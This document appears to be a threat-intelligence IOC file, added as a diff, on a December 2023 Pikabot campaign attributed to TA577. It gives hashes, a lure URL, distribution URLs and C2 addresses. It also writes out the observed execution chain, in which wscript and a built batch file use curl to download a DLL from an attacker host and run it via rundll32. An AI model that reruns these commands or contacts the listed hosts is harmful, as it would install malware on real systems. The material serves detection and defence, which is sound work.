@@ -1,0 +1,72 @@
+12.12.2023 | Pikabot | TA577 | 1.1.17-ghost
+
+*************************************************
+
+.pdf f4f5b27de0f22e676db02e97e9c962c7657d4cd02f241b33a069f9b64f3bab9c
+.url https://grabpanda.com/ld/?tPFutapSPjIPmjKvTVfqvKEMrBrgyXkhMjIzLdOIpjbydi
+.zip 4a6d8020b61623b5a13a4fc27c5de1d1ae71c56b456b9646e1c5711f94caab82
+.zip 9ca1457792dc6dbf401e93b15846640f1b9fa7066ed9371e1d0f62c28d0a033f
+.dll e0a211704b19f41d2e912e5d33642494ccef862a3d13e176b0a258ea59412fbf
+
+*************************************************
+
+wscript.exe C:\Users\Admin\AppData\Local\Temp\Notext.js
+
+cmd.exe /c del C:\Users\Admin\AppData\Local\Temp\Notext.js
+
+cmd.exe /c echo|set /p=cu > C:\Users\Admin\AppData\Local\Temp\id.u.bat
+
+cmd.exe  /S /D /c echo
+
+cmd.exe  /S /D /c set /p=cu 1>C:\Users\Admin\AppData\Local\Temp\id.u.bat
+
+cmd.exe /c echo rl https://martenesid.com/bb7k/410636334 --output C:\Users\Admin\AppData\Local\Temp\eveniet.e --ssl-no-revoke --insecure --location >> C:\Users\Admin\AppData\Local\Temp\id.u.bat
+
+cmd.exe /c C:\Users\Admin\AppData\Local\Temp\id.u.bat
+
+curl  https://martenesid.com/bb7k/410636334 --output C:\Users\Admin\AppData\Local\Temp\eveniet.e --ssl-no-revoke --insecure --location 
+
+cmd.exe /c del C:\Users\Admin\AppData\Local\Temp\id.u.bat
+
+cmd.exe /c ren C:\Users\Admin\AppData\Local\Temp\eveniet.e cum.h
+
+rundll32.exe C:\Users\Admin\AppData\Local\Temp\cum.h Enter
+
+
+*************************************************
+
+.dll distro urls
+
+https://martenesid.com/bb7k/410636334
+https://lorented.com/gf4/199960121
+https://frasana.com/DfoM/883348960
+https://filersed.com/IHq/29994381
+https://kelsoret.com/KZY/804578135
+
+*************************************************
+
+c2's
+
+154.38.184.3:2223
+154.38.184.18:2225
+65.20.98.24:13783
+155.138.203.158:1194
+31.220.96.162:2224
+158.220.90.198:2083
+65.20.82.254:5243
+139.180.185.171:2222
+109.123.227.54:13785
+
+HTTPS Checking Traffic
+
+https://154.38.184.3:2223/distances/
+https://154.38.184.18:2225/distances/
+https://65.20.98.24:13783/distances/
+https://155.138.203.158:1194/distances/
+https://31.220.96.162:2224/distances/
+https://158.220.90.198:2083/distances/
+https://65.20.82.254:5243/distances/
+https://139.180.185.171:2222/distances/
+https://109.123.227.54:13785/distances/
+
+*************************************************
